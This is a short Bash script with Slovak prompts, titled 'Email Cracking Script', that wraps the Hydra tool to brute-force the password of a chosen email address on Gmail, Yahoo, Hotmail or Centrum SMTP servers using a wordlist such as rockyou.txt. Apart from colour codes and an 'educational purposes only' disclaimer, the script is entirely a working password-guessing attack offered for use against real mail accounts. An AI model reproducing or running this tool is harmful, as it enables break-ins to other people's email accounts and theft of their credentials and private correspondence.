#!/bin/bash

cervena="\e[31m"
modra="\e[94m"
oranzova="\e[33m"
fialova="\e[35m"
zelena="\e[32m"
konec="\e[0m"

printf "${modra}"
echo "<======================================================================>"
printf "${cervena}"
figlet "Email Cracking Script"
printf "${fialova}"
echo "=>VYTVORIL: Sapphiol557"
echo "=>DÁTUM VYTVORENIA: 2021/04/10"
echo "=>POZNÁMKA: Uisti sa, že máš stiahnutú aplikáciu Hydra a pripravený wordlist"
printf "${cervena}"
echo "==>!!PROGRAM JE UČENÝ PRE VZDELÁVACIE ÚČELY. NEMÁ NABÁDAŤ NIKOHO NA NELEGÁLNE ČINNOSTI!!<=="
echo "==>!!POUŽÍVANIE PROGRAMU NA NELEGÁLNE ÚČELY JE NA VLASTNÚ ZODPOVEDNOSŤ!!<=="
printf "${modra}"
echo "<======================================================================>"

printf "${zelena}"
echo Poďme na to
echo Pokial si pripravený a prečítal si si informácie napíš ready:
read ready
printf "${cervena}"
echo Vyber si SMTP službu:
printf "${zelena}"
echo Gmail = smtp.gmail.com
echo Yahoo = smtp.mail.yahoo.com
echo Hotmail = smtp.live.com
echo Centrum = smtp.centrum.sk/cz
printf "${cervena}"
echo "Sem napíš tvoj výber (napr:smtp.gmail.com):"
printf "${konec}"
read smtp
printf "${cervena}"
echo Sem napíš Emailovú adresu:
printf "${konec}"
read email
printf "${cervena}"
echo Sem napíš adresu wordlistu:
printf "${zelena}"
echo "(Základný wordlist v kali linuxe je v /usr/share/wordlists/rockyou.txt)"
printf "${konec}"
read wordlist

hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp

